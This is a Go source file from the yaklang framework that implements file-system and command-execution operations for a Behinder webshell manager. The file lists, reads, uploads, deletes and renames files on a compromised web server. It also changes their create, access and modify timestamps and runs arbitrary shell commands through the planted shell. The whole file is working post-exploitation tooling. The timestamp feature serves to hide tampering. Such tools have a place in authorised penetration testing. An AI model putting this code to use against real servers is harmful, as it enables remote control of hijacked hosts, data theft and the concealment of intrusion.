package wsm

import (
	"encoding/base64"
	"github.com/tidwall/gjson"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/url"
	"path/filepath"
	"strconv"
	"time"
)

type BehidnerFileSystemAction struct {
	behinderCache map[string]*Behinder
}

func behidnerResultToYakURLResource(originParam *ypb.YakURL, result []byte) ([]*ypb.YakURLResource, error) {
	type ResourceError struct {
		resources []*ypb.YakURLResource
		err       error
	}

	resErr := &ResourceError{}
	gjson.GetBytes(result, "msg").ForEach(func(_, v gjson.Result) bool {
		var extra []*ypb.KVPair
		newParam := &ypb.YakURL{
			Schema:   originParam.Schema,
			User:     originParam.GetUser(),
			Pass:     originParam.GetPass(),
			Location: originParam.GetLocation(),
			Query:    originParam.GetQuery(),
		}
		if v.Type == gjson.String {
			name := filepath.Base(originParam.GetPath())
			newParam.Path = originParam.GetPath()

			content, err := base64.StdEncoding.DecodeString(v.String())
			if err != nil {
				resErr.err = err
				return true
			}
			extra = []*ypb.KVPair{
				// TODO
				{Key: "content", Value: utils.EscapeInvalidUTF8Byte(content)},
			}
			var resource = &ypb.YakURLResource{
				Path:         newParam.Path,
				Url:          newParam,
				ResourceName: name,
				VerboseName:  name,
				Extra:        extra,
			}
			resErr.resources = append(resErr.resources, resource)
			return true
		}

		if v.Type == gjson.JSON {
			name := v.Get("name").String()
			if name == "." || name == ".." {
				return true
			}
			size := v.Get("size").Int()
			typ := v.Get("type").String()
			lastModified := v.Get("lastModified").String()
			perm := v.Get("perm").String()

			if len(perm) > 0 {
				extra = []*ypb.KVPair{
					{Key: "perm", Value: perm},
				}
			}
			newParam.Path = filepath.Join(originParam.GetPath(), name)

			var resource = &ypb.YakURLResource{
				Size:         size,
				SizeVerbose:  utils.ByteSize(uint64(size)),
				Path:         newParam.Path,
				Url:          newParam,
				ResourceName: name,
				VerboseName:  name,
				Extra:        extra,
			}

			if typ == "directory" {
				resource.ResourceType = "dir"
				resource.VerboseType = "behinder-directory"
				resource.HaveChildrenNodes = true
			} else {
				resource.ResourceType = "file"
				resource.VerboseType = "behinder-file"
				resource.HaveChildrenNodes = false
			}
			loc, _ := time.LoadLocation("Asia/Shanghai")

			// Parse the "lastModified" string to a Unix timestamp
			t, err := time.ParseInLocation("2006/01/02 15:04:05", lastModified, loc)
			if err == nil {
				resource.ModifiedTimestamp = t.Unix()
			}

			resErr.resources = append(resErr.resources, resource)
		}
		return true
	})
	if resErr.err != nil {
		return nil, resErr.err
	}
	return resErr.resources, nil
}

func (b *BehidnerFileSystemAction) newBehinderFormId(id string) (*Behinder, error) {
	if b.behinderCache == nil {
		b.behinderCache = make(map[string]*Behinder)
	}
	if manager, ok := b.behinderCache[id]; ok {
		return manager, nil
	}
	idInt, err := strconv.Atoi(id)
	if err != nil {
		return nil, utils.Errorf("cannot parse id[%s] as int: %s", id, err)
	}
	db := consts.GetGormProjectDatabase()
	shell, err := yakit.GetWebShell(db, int64(idInt))
	if err != nil {
		return nil, err
	}
	manager, err := NewBehinder(shell)
	if err != nil {
		return nil, err
	}
	if shell.GetPacketCodecName() != "" {
		script, err := yakit.GetYakScriptByName(db, shell.GetPacketCodecName())
		if err != nil {
			return nil, err
		}

		manager.SetPacketScriptContent(script.Content)
	}
	if shell.GetPayloadCodecName() != "" {
		script, err := yakit.GetYakScriptByName(db, shell.GetPayloadCodecName())
		if err != nil {
			return nil, err
		}
		manager.SetPayloadScriptContent(script.Content)
	}
	b.behinderCache[id] = manager
	return manager, nil
}

func (b *BehidnerFileSystemAction) Get(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	u := params.GetUrl()
	path := u.GetPath()

	var query = make(url.Values)
	for _, v := range u.GetQuery() {
		query.Add(v.GetKey(), v.GetValue())
	}
	if query.Get("op") == "cmd" {
		return b.Do(params)
	}
	id := query.Get("id")
	manager, err := b.newBehinderFormId(id)
	if err != nil {
		return nil, err
	}
	var res []*ypb.YakURLResource
	switch query.Get("mode") {
	case "list":
		list, err := manager.listFile(path)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, list)
		if err != nil {
			return nil, err
		}
	case "show":
		show, er := manager.showFile(path)
		if er != nil {
			return nil, er
		}
		res, err = behidnerResultToYakURLResource(u, show)
		if err != nil {
			return nil, err
		}
	case "check":
		check, er := manager.checkFileHash(path, "")
		if er != nil {
			return nil, er
		}
		res, err = behidnerResultToYakURLResource(u, check)
		if err != nil {
			return nil, err
		}
	case "checkExist":
		check, er := manager.checkFileExist(path)
		if er != nil {
			return nil, er
		}
		res, err = behidnerResultToYakURLResource(u, check)
		if err != nil {
			return nil, err
		}

	case "getTimeStamp":
		check, er := manager.getTimeStamp(path)
		if er != nil {
			return nil, er
		}
		res, err = behidnerResultToYakURLResource(u, check)
		if err != nil {
			return nil, err
		}
	}

	return &ypb.RequestYakURLResponse{
		Page:      1,
		PageSize:  100,
		Total:     int64(len(res)),
		Resources: res,
	}, nil
}

func (b *BehidnerFileSystemAction) Post(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	u := params.GetUrl()
	path := u.GetPath()
	_ = path
	var query = make(url.Values)
	for _, v := range u.GetQuery() {
		query.Add(v.GetKey(), v.GetValue())
	}
	id := query.Get("id")
	manager, err := b.newBehinderFormId(id)
	if err != nil {
		return nil, err
	}
	var res []*ypb.YakURLResource
	switch query.Get("mode") {

	case "updateTimeStamp":
		cts := query.Get("createTimeStamp")
		ats := query.Get("accessTimeStamp")
		mts := query.Get("modifyTimeStamp")
		if cts == "" && ats == "" && mts == "" {
			return nil, utils.Errorf("createTimeStamp, accessTimeStamp, modifyTimeStamp cannot be empty at the same time")
		}
		updateTimeStamp, err := manager.updateTimeStamp(path, cts, ats, mts)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, updateTimeStamp)
		if err != nil {
			return nil, err
		}
	case "rename":
		newPath := query.Get("")
		rename, err := manager.renameFile(path, newPath)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, rename)
		if err != nil {
			return nil, err
		}

	}

	return &ypb.RequestYakURLResponse{
		Page:      1,
		PageSize:  100,
		Total:     int64(len(res)),
		Resources: res,
	}, nil
}

func (b *BehidnerFileSystemAction) Put(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	u := params.GetUrl()
	path := u.GetPath()

	var query = make(url.Values)
	for _, v := range u.GetQuery() {
		query.Add(v.GetKey(), v.GetValue())
	}
	id := query.Get("id")
	manager, err := b.newBehinderFormId(id)
	if err != nil {
		return nil, err
	}
	var res []*ypb.YakURLResource
	switch query.Get("mode") {
	case "create":
		// TODO setting buffsize
		list, err := manager.uploadFile(path, params.GetBody())
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, list)
		if err != nil {
			return nil, err
		}
	case "append":
		show, er := manager.appendFile(path, params.GetBody())
		if er != nil {
			return nil, er
		}
		res, err = behidnerResultToYakURLResource(u, show)
	case "createFile":
		fileName := query.Get("")
		createFile, err := manager.createFile(fileName)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, createFile)
		if err != nil {
			return nil, err
		}
	case "createDirectory":
		dirName := query.Get("")
		createDir, err := manager.createDirectory(dirName)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, createDir)
		if err != nil {
			return nil, err
		}
	case "update":
		// TODO blcok size
		update, err := manager.uploadFilePart(path, params.GetBody(), 0, 1)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, update)
		if err != nil {
			return nil, err
		}

	}

	return &ypb.RequestYakURLResponse{
		Page:      1,
		PageSize:  100,
		Total:     int64(len(res)),
		Resources: res,
	}, nil
}

func (b *BehidnerFileSystemAction) Delete(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	u := params.GetUrl()
	path := u.GetPath()
	_ = path
	var query = make(url.Values)
	for _, v := range u.GetQuery() {
		query.Add(v.GetKey(), v.GetValue())
	}
	id := query.Get("id")
	manager, err := b.newBehinderFormId(id)
	if err != nil {
		return nil, err
	}
	var res []*ypb.YakURLResource
	switch query.Get("mode") {
	case "delete":
		del, err := manager.deleteFile(path)
		if err != nil {
			return nil, err
		}
		res, err = behidnerResultToYakURLResource(u, del)
		if err != nil {
			return nil, err
		}
	}

	return &ypb.RequestYakURLResponse{
		Page:      1,
		PageSize:  100,
		Total:     int64(len(res)),
		Resources: res,
	}, nil
}

func (b *BehidnerFileSystemAction) Head(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	//TODO implement me
	panic("implement me")
}

func (b *BehidnerFileSystemAction) Do(params *ypb.RequestYakURLParams) (*ypb.RequestYakURLResponse, error) {
	u := params.GetUrl()
	path := u.GetPath()

	var query = make(url.Values)
	for _, v := range u.GetQuery() {
		query.Add(v.GetKey(), v.GetValue())
	}

	cmd := query.Get("cmd")
	id := query.Get("id")
	manager, err := b.newBehinderFormId(id)
	if err != nil {
		return nil, err
	}

	raw, err := manager.CommandExec(cmd)
	if err != nil {
		return nil, err
	}

	content := gjson.GetBytes(raw, "msg").String()

	var res []*ypb.YakURLResource
	extra := []*ypb.KVPair{
		{Key: "content", Value: content},
	}
	var resource = &ypb.YakURLResource{
		Path:  path,
		Extra: extra,
	}
	res = append(res, resource)
	return &ypb.RequestYakURLResponse{
		Page:      1,
		PageSize:  100,
		Total:     int64(len(res)),
		Resources: res,
	}, nil
}

type ListFiles struct{}

func (l *ListFiles) Execute(base BaseShellManager) ([]byte, error) {
	// code to list files
	//base.
	return nil, nil
}

func (b *Behinder) showFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "show",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) listFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "list",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) checkFileHash(path, hash string) ([]byte, error) {
	params := map[string]string{
		"mode": "list",
		"path": path,
		"hash": hash,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) getTimeStamp(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "getTimeStamp",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) updateTimeStamp(path, createTimeStamp, accessTimeStamp, modifyTimeStamp string) ([]byte, error) {
	params := map[string]string{
		"mode":            "getTimeStamp",
		"path":            path,
		"createTimeStamp": createTimeStamp,
		"accessTimeStamp": accessTimeStamp,
		"modifyTimeStamp": modifyTimeStamp,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) deleteFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "delete",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) compress(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "compress",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) checkFileExist(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "checkExist",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) renameFile(old, new string) ([]byte, error) {
	params := map[string]string{
		"mode":    "rename",
		"path":    old,
		"newPath": new,
	}
	if b.ShellScript == ypb.ShellScript_PHP.String() {
		params["content"] = ""
		params["charset"] = ""
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) createFile(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "createFile",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) createDirectory(path string) ([]byte, error) {
	params := map[string]string{
		"mode": "createDirectory",
		"path": path,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) downloadFile(remote, local string) ([]byte, error) {
	params := map[string]string{
		"mode": "download",
		"path": remote,
	}
	b.processParams(params)
	payload, err := b.getPayload(payloads.FileOperationGo, params)
	if err != nil {
		return nil, err
	}
	fileContent, err := b.sendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	return fileContent, nil
}

func (b *Behinder) uploadFile(remote string, fileContent []byte) ([]byte, error) {
	params := map[string]string{
		"mode":    "create",
		"path":    remote,
		"content": base64.StdEncoding.EncodeToString(fileContent),
	}
	b.processParams(params)
	payload, err := b.getPayload(payloads.FileOperationGo, params)
	if err != nil {
		return nil, err
	}
	bres, err := b.sendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	return bres, nil
}

func (b *Behinder) appendFile(remote string, fileContent []byte) ([]byte, error) {
	params := map[string]string{
		"mode":    "append",
		"path":    remote,
		"content": base64.StdEncoding.EncodeToString(fileContent),
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) uploadFilePart(remote string, fileContent []byte, blockIndex, blockSize uint64) ([]byte, error) {
	params := map[string]string{
		"mode":       "update",
		"path":       remote,
		"blockIndex": strconv.FormatUint(blockIndex, 10),
		"blockSize":  strconv.FormatUint(blockSize, 10),
		"content":    base64.StdEncoding.EncodeToString(fileContent),
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}

func (b *Behinder) downFilePart(remote string, fileContent []byte, blockIndex, blockSize uint64) ([]byte, error) {
	params := map[string]string{
		"mode":       "downloadPart",
		"path":       remote,
		"blockIndex": strconv.FormatUint(blockIndex, 10),
		"blockSize":  strconv.FormatUint(blockSize, 10),
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.FileOperationGo, params)
}
